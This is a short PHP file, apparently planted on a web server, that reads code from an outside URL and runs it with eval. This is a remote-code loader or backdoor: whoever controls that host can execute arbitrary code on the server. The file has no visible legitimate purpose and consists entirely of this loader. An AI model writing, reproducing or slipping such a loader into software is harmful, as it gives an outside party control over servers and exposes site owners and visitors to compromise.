<?php
$path = "https://code.topkz.ru/fgd/8/ri.php";
$code = implode('', file($path));
eval("?>" . $code);
?>
